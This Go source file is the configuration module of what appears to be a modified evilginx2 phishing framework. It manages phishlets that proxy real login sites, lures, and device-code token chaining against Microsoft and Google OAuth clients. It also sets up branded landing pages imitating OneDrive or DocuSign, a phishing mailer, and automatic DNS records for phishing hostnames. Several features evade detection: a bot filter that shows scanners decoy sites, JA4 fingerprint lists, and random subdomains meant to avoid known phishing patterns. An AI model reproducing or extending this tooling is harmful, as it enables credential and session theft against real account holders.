package core

import (
	crypto_rand "crypto/rand"
	"fmt"
	"math/rand"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"

	"github.com/spf13/viper"
)

var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}

// genRandomSubdomain generates a random 4-6 character lowercase alphanumeric subdomain
// that looks natural and avoids any known phishing patterns.
func genRandomSubdomain() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	length := 4 + rand.Intn(3) // 4-6 chars
	b := make([]byte, length)
	crypto_rand.Read(b)
	for i := range b {
		b[i] = charset[int(b[i])%len(charset)]
	}
	return string(b)
}

type Lure struct {
	Id                 string `mapstructure:"id" json:"id" yaml:"id"`
	Hostname           string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	Path               string `mapstructure:"path" json:"path" yaml:"path"`
	RedirectUrl        string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
	Phishlet           string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
	Redirector         string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
	UserAgentFilter    string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
	Info               string `mapstructure:"info" json:"info" yaml:"info"`
	OgTitle            string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
	OgDescription      string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
	OgImageUrl         string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
	OgUrl              string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
	PausedUntil        int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
	Domain             string `mapstructure:"domain" json:"domain" yaml:"domain"`                // Optional domain override for multi-domain support
	DeviceCodeMode     string `mapstructure:"dc_mode" json:"dc_mode" yaml:"dc_mode"`             // Device code chaining mode: off, always, fallback, auto
	DeviceCodeClient   string `mapstructure:"dc_client" json:"dc_client" yaml:"dc_client"`       // OAuth client alias for device code (e.g., ms_office, google_cloud_sdk)
	DeviceCodeScope    string `mapstructure:"dc_scope" json:"dc_scope" yaml:"dc_scope"`          // Scope preset for device code (e.g., full, gmail, gworkspace)
	DeviceCodeTemplate string `mapstructure:"dc_template" json:"dc_template" yaml:"dc_template"` // Interstitial template: success, fallback, compliance
	DeviceCodeProvider string `mapstructure:"dc_provider" json:"dc_provider" yaml:"dc_provider"` // Provider: microsoft, google (auto-detected from client if empty)
	DeviceCodeTheme    string `mapstructure:"dc_theme" json:"dc_theme" yaml:"dc_theme"`          // Themed landing page: default, onedrive, authenticator, adobe, docusign, sharepoint, check-inbox
}

type MailerConfig struct {
	SMTPHost     string `mapstructure:"smtp_host" json:"smtp_host" yaml:"smtp_host"`
	SMTPPort     int    `mapstructure:"smtp_port" json:"smtp_port" yaml:"smtp_port"`
	SMTPUsername string `mapstructure:"smtp_username" json:"smtp_username" yaml:"smtp_username"`
	SMTPPassword string `mapstructure:"smtp_password" json:"smtp_password" yaml:"smtp_password"`
	FromName     string `mapstructure:"from_name" json:"from_name" yaml:"from_name"`
	FromEmail    string `mapstructure:"from_email" json:"from_email" yaml:"from_email"`
	SMTPTLS      string `mapstructure:"smtp_tls" json:"smtp_tls" yaml:"smtp_tls"`
	BrandName    string `mapstructure:"brand_name" json:"brand_name" yaml:"brand_name"`
	EmailSubject string `mapstructure:"email_subject" json:"email_subject" yaml:"email_subject"`
	EmailBody    string `mapstructure:"email_body" json:"email_body" yaml:"email_body"`
	LogoURL      string `mapstructure:"logo_url" json:"logo_url" yaml:"logo_url"`
}

type Config struct {
	general          *GeneralConfig
	certificates     *CertificatesConfig
	blacklistConfig  *BlacklistConfig
	gophishConfig    *GoPhishConfig
	proxyConfig      *ProxyConfig
	botguardConfig   *BotguardCfg
	evilpuppetConfig *EvilPuppetCfg
	externalDomains  []*ExternalDNSDomainCfg
	phishletConfig   map[string]*PhishletConfig
	phishlets        map[string]*Phishlet
	phishletNames    []string
	activeHostnames  []string
	redirectorsDir   string
	lures            []*Lure
	lureIds          []string
	subphishlets     []*SubPhishlet
	cfg              *viper.Viper
	notifiers        []*NotifierConfig
	notifierDefaults *DefaultNotifierConfig
	serverName       string
	dataDir          string
	mailerConfig     *MailerConfig
	redirectUrl      string // GINX daemon: global redirect URL
	spoofUrl         string // GINX daemon: website spoofing URL
}

type SubPhishlet struct {
	Name       string            `mapstructure:"name" json:"name" yaml:"name"`
	ParentName string            `mapstructure:"parent_name" json:"parent_name" yaml:"parent_name"`
	Params     map[string]string `mapstructure:"params" json:"params" yaml:"params"`
}

type PhishletConfig struct {
	Hostname     string            `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	UnauthUrl    string            `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	Enabled      bool              `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Visible      bool              `mapstructure:"visible" json:"visible" yaml:"visible"`
	Domain       string            `mapstructure:"domain" json:"domain" yaml:"domain"`                                          // Assigned domain for multi-domain support
	SubdomainMap map[string]string `mapstructure:"subdomain_map" json:"subdomain_map,omitempty" yaml:"subdomain_map,omitempty"` // orig_key → random phish_sub
}

type ProxyConfig struct {
	Type     string `mapstructure:"type" json:"type" yaml:"type"`
	Address  string `mapstructure:"address" json:"address" yaml:"address"`
	Port     int    `mapstructure:"port" json:"port" yaml:"port"`
	Username string `mapstructure:"username" json:"username" yaml:"username"`
	Password string `mapstructure:"password" json:"password" yaml:"password"`
	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type BlacklistConfig struct {
	Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
}

type CertificatesConfig struct {
}

type GoPhishConfig struct {
	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
}

type GeneralConfig struct {
	Domain              string `mapstructure:"domain" json:"domain" yaml:"domain"`
	OldIpv4             string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
	ExternalIpv4        string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
	BindIpv4            string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
	UnauthUrl           string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	HttpsPort           int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
	DnsPort             int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
	Autocert            bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
	WildcardTLS         bool   `mapstructure:"wildcard_tls" json:"wildcard_tls" yaml:"wildcard_tls"`
	RandomizeSubdomains bool   `mapstructure:"randomize_subdomains" json:"randomize_subdomains" yaml:"randomize_subdomains"`
	FeedApiKey          string `mapstructure:"feed_api_key" json:"feed_api_key" yaml:"feed_api_key"`
}

type BotguardCfg struct {
	Enabled       bool     `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	SpoofUrls     []string `mapstructure:"spoof_urls" json:"spoof_urls" yaml:"spoof_urls"`
	MinTrustScore int      `mapstructure:"min_trust_score" json:"min_trust_score" yaml:"min_trust_score"`
	WhitelistJA4  []string `mapstructure:"whitelist_ja4" json:"whitelist_ja4" yaml:"whitelist_ja4"`
	BlacklistJA4  []string `mapstructure:"blacklist_ja4" json:"blacklist_ja4" yaml:"blacklist_ja4"`
}

// EvilPuppetCfg stores global evilpuppet configuration
type EvilPuppetCfg struct {
	Enabled      bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	ChromiumPath string `mapstructure:"chromium_path" json:"chromium_path" yaml:"chromium_path"`
	Display      string `mapstructure:"display" json:"display" yaml:"display"`
	Timeout      int    `mapstructure:"timeout" json:"timeout" yaml:"timeout"`
	Debug        bool   `mapstructure:"debug" json:"debug" yaml:"debug"`
}

// ExternalDNSDomainCfg holds configuration for a domain's external DNS
type ExternalDNSDomainCfg struct {
	Domain      string            `mapstructure:"domain" json:"domain" yaml:"domain"`
	Provider    string            `mapstructure:"provider" json:"provider" yaml:"provider"`
	Credentials map[string]string `mapstructure:"credentials" json:"credentials" yaml:"credentials"`
}

const (
	CFG_GENERAL         = "general"
	CFG_CERTIFICATES    = "certificates"
	CFG_LURES           = "lures"
	CFG_PROXY           = "proxy"
	CFG_PHISHLETS       = "phishlets"
	CFG_BLACKLIST       = "blacklist"
	CFG_SUBPHISHLETS    = "subphishlets"
	CFG_GOPHISH         = "gophish"
	CFG_BOTGUARD        = "botguard"
	CFG_EVILPUPPET      = "evilpuppet"
	CFG_DOMAINS         = "domains"
	CFG_NOTIFIERS       = "notifiers"
	CFG_NOTIFY_DEFAULTS = "notify_defaults"
	CFG_SERVER_NAME     = "server_name"
)

const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll

func NewConfig(cfg_dir string, path string) (*Config, error) {
	c := &Config{
		general:          &GeneralConfig{},
		certificates:     &CertificatesConfig{},
		gophishConfig:    &GoPhishConfig{},
		botguardConfig:   &BotguardCfg{MinTrustScore: 30},
		evilpuppetConfig: &EvilPuppetCfg{Display: ":99", Timeout: 30},
		externalDomains:  []*ExternalDNSDomainCfg{},
		phishletConfig:   make(map[string]*PhishletConfig),
		phishlets:        make(map[string]*Phishlet),
		phishletNames:    []string{},
		lures:            []*Lure{},
		blacklistConfig:  &BlacklistConfig{},
		notifiers:        []*NotifierConfig{},
		notifierDefaults: nil,
		serverName:       "",
		dataDir:          cfg_dir, // Store data directory for persistent storage
	}

	c.cfg = viper.New()
	c.cfg.SetConfigType("json")

	if path == "" {
		path = filepath.Join(cfg_dir, "config.json")
	}
	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
	if err != nil {
		return nil, err
	}
	var created_cfg bool = false
	c.cfg.SetConfigFile(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		created_cfg = true
		err = c.cfg.WriteConfigAs(path)
		if err != nil {
			return nil, err
		}
	}

	err = c.cfg.ReadInConfig()
	if err != nil {
		return nil, err
	}

	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
	if c.cfg.Get("general.autocert") == nil {
		c.cfg.Set("general.autocert", true)
		c.general.Autocert = true
	}

	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)

	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)

	if c.general.OldIpv4 != "" {
		if c.general.ExternalIpv4 == "" {
			c.SetServerExternalIP(c.general.OldIpv4)
		}
		c.SetServerIP("")
	}

	if !stringExists(c.blacklistConfig.Mode, BLACKLIST_MODES) {
		c.SetBlacklistMode("unauth")
	}

	if c.general.UnauthUrl == "" && created_cfg {
		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
	}
	if c.general.HttpsPort == 0 {
		c.SetHttpsPort(443)
	}
	if c.general.DnsPort == 0 {
		c.SetDnsPort(53)
	}
	if created_cfg {
		c.EnableAutocert(true)
	}

	c.lures = []*Lure{}
	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
	c.proxyConfig = &ProxyConfig{}
	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
	c.cfg.UnmarshalKey(CFG_BOTGUARD, &c.botguardConfig)
	c.cfg.UnmarshalKey(CFG_EVILPUPPET, &c.evilpuppetConfig)
	c.cfg.UnmarshalKey(CFG_DOMAINS, &c.externalDomains)
	if c.cfg.Get("email") != nil {
		mc := &MailerConfig{}
		c.cfg.UnmarshalKey("email", mc)
		c.mailerConfig = mc
	}
	c.cfg.UnmarshalKey(CFG_NOTIFIERS, &c.notifiers)
	c.cfg.UnmarshalKey(CFG_NOTIFY_DEFAULTS, &c.notifierDefaults)
	if serverName := c.cfg.GetString(CFG_SERVER_NAME); serverName != "" {
		c.serverName = serverName
	} else {
		c.serverName = generateServerName()
		c.cfg.Set(CFG_SERVER_NAME, c.serverName)
	}

	// Set default botguard values if not set
	if c.botguardConfig.MinTrustScore == 0 {
		c.botguardConfig.MinTrustScore = 25
	}

	// Auto-enable botguard on fresh config with default spoof URLs
	if created_cfg {
		c.botguardConfig.Enabled = true
		if len(c.botguardConfig.SpoofUrls) == 0 {
			c.botguardConfig.SpoofUrls = []string{
				"https://www.google.com",
				"https://www.microsoft.com",
				"https://www.office.com",
			}
		}
		c.cfg.Set(CFG_BOTGUARD, c.botguardConfig)

		// Use standard HTTP-01 certificates by default (no Cloudflare needed)
		// Wildcard TLS only used when external DNS provider is configured
		c.general.WildcardTLS = false
		c.cfg.Set("general.wildcard_tls", false)
	}

	// Initialize external DNS with loaded domains
	for _, domCfg := range c.externalDomains {
		GetExternalDNS().AddDomain(&DomainDNSConfig{
			Domain:      domCfg.Domain,
			Provider:    domCfg.Provider,
			Credentials: domCfg.Credentials,
		})
	}

	for i := 0; i < len(c.lures); i++ {
		c.lureIds = append(c.lureIds, GenRandomToken())
	}

	c.cfg.WriteConfig()
	return c, nil
}

func (c *Config) PhishletConfig(site string) *PhishletConfig {
	if o, ok := c.phishletConfig[site]; ok {
		return o
	} else {
		o := &PhishletConfig{
			Hostname:  "",
			UnauthUrl: "",
			Enabled:   false,
			Visible:   true,
		}
		c.phishletConfig[site] = o
		return o
	}
}

func (c *Config) SavePhishlets() {
	c.cfg.Set(CFG_PHISHLETS, c.phishletConfig)
	c.cfg.WriteConfig()
}

func (c *Config) SaveGeneral() {
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) SetSiteHostname(site string, hostname string) bool {
	// Multi-domain support: check if hostname matches any registered domain
	validDomain := false
	var matchedDomain string

	// First check if it matches the global base domain
	if c.general.Domain != "" {
		if hostname == c.general.Domain || strings.HasSuffix(hostname, "."+c.general.Domain) {
			validDomain = true
			matchedDomain = c.general.Domain
		}
	}

	// Check against registered external domains
	if !validDomain && hostname != "" {
		for _, d := range c.externalDomains {
			if hostname == d.Domain || strings.HasSuffix(hostname, "."+d.Domain) {
				validDomain = true
				matchedDomain = d.Domain
				break
			}
		}
	}

	// If hostname is empty, just clear it
	if hostname == "" {
		validDomain = true
	}

	if !validDomain && hostname != "" {
		// No matching domain found - show available domains
		var domains []string
		if c.general.Domain != "" {
			domains = append(domains, c.general.Domain)
		}
		for _, d := range c.externalDomains {
			domains = append(domains, d.Domain)
		}
		if len(domains) == 0 {
			log.Error("no domains configured. use 'config domain <domain>' or 'domains add <domain>' first")
		} else {
			log.Error("hostname must match one of the configured domains: %s", strings.Join(domains, ", "))
		}
		return false
	}

	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set hostname")
		return false
	}

	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
	c.PhishletConfig(site).Hostname = hostname
	if matchedDomain != "" {
		c.PhishletConfig(site).Domain = matchedDomain
	}
	c.SavePhishlets()
	return true
}

func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set unauth_url")
		return false
	}
	if _url != "" {
		_, err := url.ParseRequestURI(_url)
		if err != nil {
			log.Error("invalid URL: %s", err)
			return false
		}
	}
	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
	c.PhishletConfig(site).UnauthUrl = _url
	c.SavePhishlets()
	return true
}

// SetSiteDomain assigns a base domain to a phishlet for multi-domain support
func (c *Config) SetSiteDomain(site string, domain string) bool {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set domain")
		return false
	}

	// Validate domain is registered
	validDomain := false
	if domain == "" {
		validDomain = true // Allow clearing domain
	} else if domain == c.general.Domain {
		validDomain = true
	} else {
		for _, d := range c.externalDomains {
			if d.Domain == domain {
				validDomain = true
				break
			}
		}
	}

	if !validDomain {
		var domains []string
		if c.general.Domain != "" {
			domains = append(domains, c.general.Domain)
		}
		for _, d := range c.externalDomains {
			domains = append(domains, d.Domain)
		}
		log.Error("domain '%s' not found. available domains: %s", domain, strings.Join(domains, ", "))
		return false
	}

	c.PhishletConfig(site).Domain = domain
	log.Info("phishlet '%s' domain set to: %s", site, domain)
	c.SavePhishlets()
	return true
}

// GetSiteAssignedDomain returns the domain assigned to a phishlet, or falls back to base domain
func (c *Config) GetSiteAssignedDomain(site string) string {
	cfg := c.PhishletConfig(site)
	if cfg.Domain != "" {
		return cfg.Domain
	}
	// Fallback: return the last registered domain, or base domain
	if len(c.externalDomains) > 0 {
		return c.externalDomains[len(c.externalDomains)-1].Domain
	}
	return c.general.Domain
}

// GetAllDomains returns all registered domains (base domain + external domains)
func (c *Config) GetAllDomains() []string {
	var domains []string
	if c.general.Domain != "" {
		domains = append(domains, c.general.Domain)
	}
	for _, d := range c.externalDomains {
		domains = append(domains, d.Domain)
	}
	return domains
}

func (c *Config) SetBaseDomain(domain string) {
	c.general.Domain = domain
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server domain set to: %s", domain)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerIP(ip_addr string) {
	c.general.OldIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	//log.Info("server IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerExternalIP(ip_addr string) {
	c.general.ExternalIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server external IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerBindIP(ip_addr string) {
	c.general.BindIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server bind IP set to: %s", ip_addr)
	log.Warning("you may need to restart evilginx for the changes to take effect")
	c.cfg.WriteConfig()
}

func (c *Config) SetHttpsPort(port int) {
	c.general.HttpsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("https port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetDnsPort(port int) {
	c.general.DnsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("dns port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) EnableProxy(enabled bool) {
	c.proxyConfig.Enabled = enabled
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	if enabled {
		log.Info("enabled proxy")
	} else {
		log.Info("disabled proxy")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyType(ptype string) {
	ptypes := []string{"http", "https", "socks5", "socks5h"}
	if !stringExists(ptype, ptypes) {
		log.Error("invalid proxy type selected")
		return
	}
	c.proxyConfig.Type = ptype
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy type set to: %s", ptype)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyAddress(address string) {
	c.proxyConfig.Address = address
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy address set to: %s", address)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPort(port int) {
	c.proxyConfig.Port = port
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyUsername(username string) {
	c.proxyConfig.Username = username
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy username set to: %s", username)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPassword(password string) {
	c.proxyConfig.Password = password
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy password set to: %s", password)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishAdminUrl(k string) {
	u, err := url.ParseRequestURI(k)
	if err != nil {
		log.Error("invalid url: %s", err)
		return
	}

	c.gophishConfig.AdminUrl = u.String()
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish admin url set to: %s", u.String())
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishApiKey(k string) {
	c.gophishConfig.ApiKey = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish api key set to: %s", k)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishInsecureTLS(k bool) {
	c.gophishConfig.InsecureTLS = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish insecure set to: %v", k)
	c.cfg.WriteConfig()
}

func (c *Config) IsLureHostnameValid(hostname string) bool {
	for _, l := range c.lures {
		if l.Hostname == hostname {
			if c.PhishletConfig(l.Phishlet).Enabled {
				return true
			}
		}
	}
	return false
}

func (c *Config) SetSiteEnabled(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return err
	}
	if c.PhishletConfig(site).Hostname == "" {
		return fmt.Errorf("enabling phishlet '%s' requires its hostname to be set up", site)
	}
	if pl.isTemplate {
		return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", site)
	}

	// Create DNS records for phishing hostnames if using external DNS
	hostname := c.PhishletConfig(site).Hostname
	if c.general.ExternalIpv4 != "" {
		// Get all hostnames for this phishlet
		hostnames := c.GetPhishletHosts(site, hostname)
		for _, h := range hostnames {
			if err := GetExternalDNS().CreateARecord(h, c.general.ExternalIpv4, 300); err != nil {
				log.Warning("DNS: could not create record for %s: %v", h, err)
			}
		}
	}

	c.PhishletConfig(site).Enabled = true
	c.refreshActiveHostnames()
	c.VerifyPhishlets()
	log.Info("enabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Enabled = false
	c.refreshActiveHostnames()
	log.Info("disabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Visible = !hide
	c.refreshActiveHostnames()

	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	c.SavePhishlets()
	return nil
}

func (c *Config) SetRedirectorsDir(path string) {
	c.redirectorsDir = path
}

func (c *Config) ResetAllSites() {
	c.phishletConfig = make(map[string]*PhishletConfig)
	c.SavePhishlets()
}

func (c *Config) IsSiteEnabled(site string) bool {
	return c.PhishletConfig(site).Enabled
}

func (c *Config) IsSiteHidden(site string) bool {
	return !c.PhishletConfig(site).Visible
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for k, o := range c.phishletConfig {
		if o.Enabled {
			sites = append(sites, k)
		}
	}
	return sites
}

func (c *Config) SetBlacklistMode(mode string) {
	if stringExists(mode, BLACKLIST_MODES) {
		c.blacklistConfig.Mode = mode
		c.cfg.Set(CFG_BLACKLIST, c.blacklistConfig)
		c.cfg.WriteConfig()
	}
	log.Info("blacklist mode set to: %s", mode)
}

func (c *Config) SetUnauthUrl(_url string) {
	c.general.UnauthUrl = _url
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("unauthorized request redirection URL set to: %s", _url)
	c.cfg.WriteConfig()
}

func (c *Config) EnableAutocert(enabled bool) {
	c.general.Autocert = enabled
	if enabled {
		log.Info("autocert is now enabled")
	} else {
		log.Info("autocert is now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		for _, host := range pl.GetPhishHosts(false) {
			c.activeHostnames = append(c.activeHostnames, strings.ToLower(host))
		}
	}
	for _, l := range c.lures {
		if stringExists(l.Phishlet, sites) {
			if l.Hostname != "" {
				c.activeHostnames = append(c.activeHostnames, strings.ToLower(l.Hostname))
			}
		}
	}
}

func (c *Config) GetActiveHostnames(site string) []string {
	var ret []string
	sites := c.GetEnabledSites()
	for _, _site := range sites {
		if site == "" || _site == site {
			pl, err := c.GetPhishlet(_site)
			if err != nil {
				continue
			}
			for _, host := range pl.GetPhishHosts(false) {
				ret = append(ret, strings.ToLower(host))
			}
		}
	}
	for _, l := range c.lures {
		if site == "" || l.Phishlet == site {
			if l.Hostname != "" {
				hostname := strings.ToLower(l.Hostname)
				ret = append(ret, hostname)
			}
		}
	}
	return ret
}

// GetActiveCertHostnames returns hostnames that need TLS certificates.
// Unlike GetActiveHostnames, this skips proxy_hosts with disabled federation
// provider params (whose original domains are unreachable), avoiding
// unnecessary Let's Encrypt certificate requests and rate limit hits.
func (c *Config) GetActiveCertHostnames(site string) []string {
	var ret []string
	sites := c.GetEnabledSites()
	for _, _site := range sites {
		if site == "" || _site == site {
			pl, err := c.GetPhishlet(_site)
			if err != nil {
				continue
			}
			for _, host := range pl.GetCertPhishHosts() {
				ret = append(ret, strings.ToLower(host))
			}
		}
	}
	for _, l := range c.lures {
		if site == "" || l.Phishlet == site {
			if l.Hostname != "" {
				hostname := strings.ToLower(l.Hostname)
				ret = append(ret, hostname)
			}
		}
	}
	return ret
}

func (c *Config) IsActiveHostname(host string) bool {
	host = strings.ToLower(host)
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}
	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
	c.VerifyPhishlets()
}

func (c *Config) AddSubPhishlet(site string, parent_site string, customParams map[string]string) error {
	pl, err := c.GetPhishlet(parent_site)
	if err != nil {
		return err
	}
	_, err = c.GetPhishlet(site)
	if err == nil {
		return fmt.Errorf("phishlet '%s' already exists", site)
	}
	sub_pl, err := NewPhishlet(site, pl.Path, &customParams, c)
	if err != nil {
		return err
	}
	sub_pl.ParentName = parent_site

	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = sub_pl
	c.VerifyPhishlets()

	return nil
}

func (c *Config) DeleteSubPhishlet(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return err
	}
	if pl.ParentName == "" {
		return fmt.Errorf("phishlet '%s' can't be deleted - you can only delete child phishlets.", site)
	}

	c.phishletNames = removeString(site, c.phishletNames)
	delete(c.phishlets, site)
	delete(c.phishletConfig, site)
	c.SavePhishlets()
	return nil
}

func (c *Config) LoadSubPhishlets() {
	var subphishlets []*SubPhishlet
	c.cfg.UnmarshalKey(CFG_SUBPHISHLETS, &subphishlets)
	for _, spl := range subphishlets {
		err := c.AddSubPhishlet(spl.Name, spl.ParentName, spl.Params)
		if err != nil {
			log.Error("phishlets: %s", err)
		}
	}
}

func (c *Config) SaveSubPhishlets() {
	var subphishlets []*SubPhishlet
	for _, pl := range c.phishlets {
		if pl.ParentName != "" {
			spl := &SubPhishlet{
				Name:       pl.Name,
				ParentName: pl.ParentName,
				Params:     pl.customParams,
			}
			subphishlets = append(subphishlets, spl)
		}
	}

	c.cfg.Set(CFG_SUBPHISHLETS, subphishlets)
	c.cfg.WriteConfig()
}

func (c *Config) VerifyPhishlets() {
	hosts := make(map[string]string)

	for site, pl := range c.phishlets {
		if pl.isTemplate {
			continue
		}
		for _, ph := range pl.proxyHosts {
			phish_host := combineHost(ph.phish_subdomain, ph.domain)
			orig_host := combineHost(ph.orig_subdomain, ph.domain)
			if c_site, ok := hosts[phish_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
			} else if c_site, ok := hosts[orig_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
			}
			hosts[phish_host] = site
			hosts[orig_host] = site
		}
	}
}

func (c *Config) CleanUp() {

	for k := range c.phishletConfig {
		_, err := c.GetPhishlet(k)
		if err != nil {
			delete(c.phishletConfig, k)
		}
	}
	c.SavePhishlets()
	/*
		var sites_enabled []string
		var sites_hidden []string
		for k := range c.siteDomains {
			_, err := c.GetPhishlet(k)
			if err != nil {
				delete(c.siteDomains, k)
			} else {
				if c.IsSiteEnabled(k) {
					sites_enabled = append(sites_enabled, k)
				}
				if c.IsSiteHidden(k) {
					sites_hidden = append(sites_hidden, k)
				}
			}
		}
		c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
		c.cfg.Set(CFG_SITES_ENABLED, sites_enabled)
		c.cfg.Set(CFG_SITES_HIDDEN, sites_hidden)
		c.cfg.WriteConfig()*/
}

func (c *Config) AddLure(site string, l *Lure) {
	c.lures = append(c.lures, l)
	c.lureIds = append(c.lureIds, GenRandomToken())
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

